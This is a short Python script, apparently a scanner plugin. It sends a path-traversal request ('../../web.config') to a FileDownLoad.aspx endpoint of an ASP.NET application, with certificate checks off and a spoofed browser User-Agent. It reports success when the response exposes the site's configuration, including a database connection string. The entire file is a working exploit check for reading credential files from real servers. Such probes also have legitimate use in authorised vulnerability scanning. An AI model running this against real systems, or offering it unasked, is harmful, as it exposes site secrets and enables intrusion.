import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	url=baseurl+"Module/FileManagement/FileDownLoad.aspx?filePath=../../web.config"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if "<add key=\"MyServerIP\"" in response.text and "<add name=\"ConnectionString\" connectionString=\"" in response.text and "<sessionState mode=\"InProc\"" in response.text and "<add key=\"YktInterface\"" in response.text:
		r0=True
	else:
		r0=False
	if r0:
		return True
	else:
		return False
